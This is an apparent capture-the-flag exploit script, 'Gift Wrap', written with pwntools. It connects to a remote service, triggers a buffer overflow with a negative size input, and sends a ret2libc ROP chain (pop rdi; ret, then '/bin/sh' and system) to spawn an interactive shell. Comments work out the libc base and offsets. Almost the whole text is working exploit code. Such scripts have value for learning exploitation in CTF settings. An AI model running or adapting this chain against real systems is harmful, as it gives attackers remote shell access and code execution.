#Gift Wrap 

from pwn import *

p = remote('35.198.185.193', 1341)

p.recv()
p.sendline('wrap')

p.recv()
p.sendline('-10')

p.recv()

p.sendline("A"*136+p64(0x7f2ec723cb8b)+p64(0x7f2ec73bfee0)+p64(0x7f2ec7263dc0))

p.interactive()




#0x7ffff75ef80a = wrap in server
#0x0000080a = wrap in GiftWrap
#0x7ffff75ef000 = server wrap - wrap in Giftwrap

#0x7f2ec701a000 = base_address

#My machine - their machine = offset
#constant offset = 0xD1305D5000

#0x7ffff7838dc0 = system in server
#0x7f2ec7263dc0 = system address -  offset

#0x7ffff7838dc0 = system in server
#0x00047dc0 = system address

#0x7ffff77f1000 = libc base
#0x001a3ee0 = /bin/sh

#0x7ffff7994ee0 = /bin/sh in the server
#0x7f2ec73bfee0 = /bin/sh in server - offset

#0x0000000000020b8b = pop rdi; ret; in libc
#0x7ffff77f1000 = libc base
#0x7ffff7811b8b = libc base + address
#0x7f2ec723cb8b = libc address of pop rdi; ret; - offset



